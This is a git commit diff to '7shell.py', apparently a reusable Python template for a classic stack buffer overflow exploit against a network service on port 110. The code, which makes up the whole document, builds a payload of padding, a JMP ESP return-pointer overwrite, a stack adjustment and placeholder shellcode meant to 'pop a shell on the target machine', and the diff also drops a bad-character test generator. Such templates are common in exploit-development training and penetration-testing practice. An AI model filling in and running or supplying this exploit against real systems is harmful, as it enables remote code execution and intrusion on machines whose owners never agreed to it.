7fef60736c43b5054a1faf0f80501045d2925068
Tym Rabchuk <tymrabchuk@gmail.com>
2019-07-04 17:58:20 -0400

    Update 7shell.py

--- BO/templates/7shell.py
+++ BO/templates/7shell.py
@@ -10,22 +10,7 @@ RPORT = 110
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST,RPORT))
 
-data = s.recv(1024)
-
-badchar_test = "" #start with empty string
-
-#determined these to be bad characters, one is a null bye and the other one is new string that will be interpreted by the program
-
-badchars = [0x00]  
-
-#generate the string using a for loop 
-for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
-	if i not in badchars: #skip the badchars
-		badchar_test += chr(i) #append each non-badchar char to the string.
-
-#open a file for writing ('w') the string as binary ('b') data
-with open("badchar_test.bin", "wb") as f:
-	f.write(badchar_test)
+s.recv(1024)
 
 #build a message
 shellcode= SHELLCODE
@@ -40,14 +25,14 @@ buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
 buf += struct.pack("<I",ptr_jmp_esp) #SRP overwrite using struct pack that does little endian work for me
 buf += sub_esp_10 #ESP  points here
-buf += shellcode
+buf += shellcode #should pop a shell on the target machine
 buf += "C"*(buf_totlen - len(buf)) #trailing padding
-buf += "\n"
+buf += "\r\n"
 
 #send the message
-s.send("VALUE" + buf)
+s.send("VALUE " + buf)
 
 #receive some data from socket
-data = s.recv(1024)
+s.recv(1024)
 
 s.close()
